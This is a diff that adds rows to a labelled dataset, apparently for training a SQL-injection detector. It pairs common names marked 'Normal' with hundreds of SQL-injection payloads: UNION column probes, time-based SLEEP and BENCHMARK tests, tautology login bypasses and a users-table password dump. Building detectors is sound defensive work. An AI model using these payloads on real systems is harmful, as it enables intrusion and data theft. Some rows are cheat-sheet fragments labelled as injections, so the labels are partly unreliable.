+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+'David',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10'",SQL Injection
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
+'Grace',Normal
+'Bob',Normal
+'Jill',Normal
+'Fran',Normal
+'Alice',Normal
+'Hank',Normal
+'Charlie',Normal
+'John',Normal
+'Grace',Normal
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+"'or benchmark(50000000,MD5(1))--'",SQL Injection
+'Grace',Normal
+'Eve',Normal
+'ORDER BY 21',SQL Injection
+'ORDER BY 9#',SQL Injection
+'or SLEEP(5)='',SQL Injection
+'David',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Eve',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
+'Fran',Normal
+'Eve',Normal
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
+'Hank',Normal
+'ORDER BY 8#',SQL Injection
+'Hank',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+'AND 1=0--',SQL Injection
+'ORDER BY 21#',SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
+'Hank',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
+'Hank',Normal
+'Hank',Normal
+'Jill',Normal
+'David',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+'David',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'Grace',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Fran',Normal
+'ORDER BY 15#',SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4--'",SQL Injection
+'Bob',Normal
+'Grace',Normal
+'Eve',Normal
+'Hank',Normal
+'' or ''*'',SQL Injection
+'ORDER BY 20--',SQL Injection
+'Eve',Normal
+'Charlie',Normal
+'Fran',Normal
+'Jill',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
+'Alice',Normal
+'Fran',Normal
+'Bob',Normal
+'ORDER BY 12',SQL Injection
+'ORDER BY SLEEP(5)',SQL Injection
+'Eve',Normal
+'Jill',Normal
+'David',Normal
+'David',Normal
+'Bob',Normal
+'Alice',Normal
+'Eve',Normal
+'David',Normal
+'Bob',Normal
+'Eve',Normal
+'Bob',Normal
+"'"""");",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Hank',Normal
+'OR 1=1#',SQL Injection
+'Hank',Normal
+'Grace',Normal
+'Charlie',Normal
+'Charlie',Normal
+"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
+'WHERE 1=1 AND 1=0',SQL Injection
+'John',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'",SQL Injection
+'Hank',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
+'HAVING 1=0#',SQL Injection
+'Eve',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#'",SQL Injection
+'Grace',Normal
+'Bob',Normal
+'Alice',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'",SQL Injection
+'Charlie',Normal
+'David',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--'",SQL Injection
+'Grace',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
+'Jill',Normal
+'Jill',Normal
+"'""""""""'",SQL Injection
+'AND 1=0#',SQL Injection
+'OR x=x',SQL Injection
+'Hank',Normal
+'David',Normal
+'Bob',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'ORDER BY 11--',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6'",SQL Injection
+'1' ORDER BY 2--+',SQL Injection
+'OR x=x--',SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
+"'admin"""" or """"1""""=""""1""""/*'",SQL Injection
+'John',Normal
+"'and (select substring(@@version,3,1))='X''",SQL Injection
+'or 1=1/*',SQL Injection
+'John',Normal
+'Comments:',SQL Injection
+'Jill',Normal
+'David',Normal
+'Jill',Normal
+'Charlie',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+'Grace',Normal
+'') or pg_sleep(5)--',SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#'",SQL Injection
+'&&SLEEP(5)#',SQL Injection
+'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#',SQL Injection
+'UNION ALL SELECT SLEEP(5)--',SQL Injection
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Alice',Normal
+'HAVING 1=1--',SQL Injection
+''''''''''''''UNION SELECT '2',SQL Injection
+'David',Normal
+'Grace',Normal
+'Hank',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
+'John',Normal
+'Hank',Normal
+'David',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
+'Alice',Normal
+'Hank',Normal
+'Fran',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
+'Grace',Normal
+'UNION ALL SELECT 1',SQL Injection
+'Eve',Normal
+'Fran',Normal
+'Grace',Normal
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'",SQL Injection
+'+ SLEEP(10) + '',SQL Injection
+'AND 1=0 AND '%'='',SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
+'Jill',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'",SQL Injection
+'' OR 'x'='x',SQL Injection
+'Alice',Normal
+"'"""" or """"""""*""""'",SQL Injection
+';,SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Bob',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7--'",SQL Injection
+'Grace',Normal
+'Grace',Normal
+'Fran',Normal
+'David',Normal
+'' OR 'x'='x',SQL Injection
+'John',Normal
+'Alice',Normal
+'Charlie',Normal
+'John',Normal
+'Alice',Normal
+'Eve',Normal
+'Hank',Normal
+'Bob',Normal
+"'' or """"'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
+"'benchmark(50000000,MD5(1))#'",SQL Injection
+'Fran',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
+'John',Normal
+'Fran',Normal
+'Charlie',Normal
+'Hank',Normal
+"'admin"""") or (""""1""""=""""1'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--'",SQL Injection
+'Jill',Normal
+'Fran',Normal
+'Bob',Normal
+'UNION ALL SELECT 1#',SQL Injection
+'Fran',Normal
+'Fran',Normal
+'ORDER BY 23#',SQL Injection
+'Eve',Normal
+'Eve',Normal
+"'admin"""" or """"1""""=""""1""""--'",SQL Injection
+'Fran',Normal
+'Bob',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
+'Alice',Normal
+"'' UNION SELECT 1,2,3 --'",SQL Injection
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#'",SQL Injection
+'Alice',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
+'Alice',Normal
+'OR x=x--',SQL Injection
+'Eve',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
+"','",SQL Injection
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
+'Charlie',Normal
+'David',Normal
+'ORDER BY 28#',SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
+'Eve',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'' UNION SELECT 1,2,3 --'",SQL Injection
+'AnD SLEEP(5)--',SQL Injection
+'Eve',Normal
+'John',Normal
+'Eve',Normal
+'Bob',Normal
+'AND true',SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--'",SQL Injection
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
+'John',Normal
+'Charlie',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'John',Normal
+'Eve',Normal
+'Alice',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
+'ORDER BY 19#',SQL Injection
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'# from wapiti',SQL Injection
+"'ORDER BY 1,SLEEP(5)#'",SQL Injection
+'Hank',Normal
+'Eve',Normal
+'Alice',Normal
+'Alice',Normal
+'||		(double pipe) concatenate',SQL Injection
+'Hank',Normal
+'David',Normal
+'UNION ALL SELECT NULL',SQL Injection
+'Bob',Normal
+"'admin""""or 1=1 or """"""""=""""'",SQL Injection
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
+'Bob',Normal
+"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
+'Jill',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),""""'3'",SQL Injection
+'WHERE 1=1 AND 1=1--',SQL Injection
+"'' UNION SELECT null, username, password FROM users --'",SQL Injection
+'Hank',Normal
+'WHERE 1=1 AND 1=1--',SQL Injection
+"'admin"""") or """"1""""=""""1'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+'ORDER BY 10--',SQL Injection
+'Charlie',Normal
+'Jill',Normal
+'Charlie',Normal
+'Grace',Normal
+'Eve',Normal
+'Alice',Normal
+'David',Normal
+'Hank',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
+'Bob',Normal
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'",SQL Injection
+"'+		addition, concatenate (or space in url)'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
+'Charlie',Normal
+'John',Normal
+'Grace',Normal
+'WHERE 1=1 AND 1=1#',SQL Injection
+'Hank',Normal
+'Jill',Normal
+'ORDER BY SLEEP(5)',SQL Injection
+'John',Normal
+'Charlie',Normal
+'Eve',Normal
+'John',Normal
+'||		(double pipe) concatenate',SQL Injection
+'Eve',Normal
+"'"""");",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+'Fran',Normal
+'John',Normal
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--'",SQL Injection
+'Hank',Normal
+"'"""" OR 1 = 1 -- -'",SQL Injection
+"'"""" or pg_sleep(5)--'",SQL Injection
+'AND 1=1--',SQL Injection
+'Charlie',Normal
+'John',Normal
+'David',Normal
+'Alice',Normal
+'Grace',Normal
+'Fran',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Jill',Normal
+"'"""" or """"""""-""""'",SQL Injection
+'ORDER BY 15--',SQL Injection
+'Jill',Normal
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'or pg_SLEEP(5)#',SQL Injection
+'Charlie',Normal
+'Bob',Normal
+'David',Normal
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Charlie',Normal
+'Grace',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+"'"""" or """"""""^""""'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Grace',Normal
+'Bob',Normal
+'Alice',Normal
+'ORDER BY 10#',SQL Injection
+'Jill',Normal
+'Hank',Normal
+'Charlie',Normal
+"',(select * from (select(sleep(10)))a)'",SQL Injection
+'Fran',Normal
+'Hank',Normal
+',SQL Injection
+"'ORDER BY 1,SLEEP(5),3,4--'",SQL Injection
+'Eve',Normal
+'David',Normal
+'Charlie',Normal
+'UNION ALL SELECT NULL',SQL Injection
+"'""""""""'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
+'Bob',Normal
+'Eve',Normal
+'Alice',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
+'Grace',Normal
+'Alice',Normal
+'''',SQL Injection
+'UNION ALL SELECT NULL',SQL Injection
+Microservice running on port 3000,Normal
+'Charlie',Normal
+'John',Normal
+'Bob',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+'David',Normal
+'Eve',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+"'UNION ALL SELECT 1,2'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+'WHERE 1=1 AND 1=1',SQL Injection
+'/*  	C-style comment',SQL Injection
+"','",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
+'Jill',Normal
+'Charlie',Normal
+'John',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
+'Grace',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'",SQL Injection
+'John',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
+'Eve',Normal
+'Charlie',Normal
+"'admin"""" or """"1""""=""""1""""#'",SQL Injection
+'Fran',Normal
+'Bob',Normal
+'Hank',Normal
+'AND 1=1 AND '%'='',SQL Injection
+'David',Normal
+"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
+'Bob',Normal
+'Fran',Normal
+'John',Normal
+'Charlie',Normal
+"'"""" OR """""""" = """"'",SQL Injection
+'OR 1=1',SQL Injection
+'Bob',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
+'Grace',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
+'Alice',Normal
+'Grace',Normal
+'OR 1=1--',SQL Injection
+'Charlie',Normal
+'Alice',Normal
+'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe',SQL Injection
+'Alice',Normal
+'Jill',Normal
+'Hank',Normal
+'John',Normal
+"'"""" or sleep(5)=""""'",SQL Injection
+'Grace',Normal
+'David',Normal
+'Jill',Normal
+'ORDER BY 19--',SQL Injection
+'Charlie',Normal
+''&&SLEEP(5)&&'1',SQL Injection
+'# Numeric',SQL Injection
+'Bob',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
+'Grace',Normal
+'Eve',Normal
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
+"'and (select substring(@@version,2,1))='i''",SQL Injection
+"''\""""'",SQL Injection
+'John',Normal
+'Grace',Normal
+'Eve',Normal
+"'"""" OR """""""" = """"'",SQL Injection
+'Fran',Normal
+'John',Normal
+'Charlie',Normal
+'Grace',Normal
+"'"""") or (""""x"""")=(""""x'",SQL Injection
+'Jill',Normal
+'Jill',Normal
+'Grace',Normal
+'Charlie',Normal
+'Fran',Normal
+'Grace',Normal
+'Fran',Normal
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
+''''''''''''''UNION SELECT '2',SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
+'Alice',Normal
+'Jill',Normal
+'ORDER BY 12--',SQL Injection
+'+ SLEEP(10) + '',SQL Injection
+'Hank',Normal
+'ORDER BY 30#',SQL Injection
+'Jill',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
+'Bob',Normal
+'Eve',Normal
+"'ORDER BY 1,SLEEP(5),3--'",SQL Injection
+'-2',SQL Injection
+'Hank',Normal
+'Eve',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
+'Bob',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
+'Alice',Normal
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'",SQL Injection
+'Bob',Normal
+'John',Normal
+'David',Normal
+'Hank',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--'",SQL Injection
+'David',Normal
+'Jill',Normal
+'Bob',Normal
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
+'David',Normal
+'`	    Backtick',SQL Injection
+'David',Normal
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9'",SQL Injection
+'Eve',Normal
+'Hank',Normal
+'ORDER BY SLEEP(5)#',SQL Injection
+'AND 1083=1083 AND (1427=1427',SQL Injection
+'Alice',Normal
+'Alice',Normal
